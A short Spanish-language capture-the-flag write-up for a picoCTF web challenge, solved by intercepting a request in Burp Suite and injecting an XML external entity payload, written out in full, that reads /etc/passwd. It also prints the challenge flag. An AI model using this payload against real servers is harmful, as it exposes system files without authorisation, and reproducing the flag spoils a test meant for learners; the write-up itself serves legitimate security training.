# Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://saturn.picoctf.net:58320/)
# Solución
Entrar a la página indicada, luego con ayuda de Burp Suite aplicar una inyección de xxe y con ello conseguir la flag

- Primero es entrar al link que se nos da, luego es abrir el Burp Suite y con ello al tratar de abrir una imagen en la página, nos aprovechamos de ello, para aplicarle una inyección de xxe:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM 'file:///etc/passwd'>
]>
<data><ID>&xxe;</ID></data>
```
Al aplicarla con ello se obtiene la flag

picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}


# Notas adicionales
- 
# Referencias
- 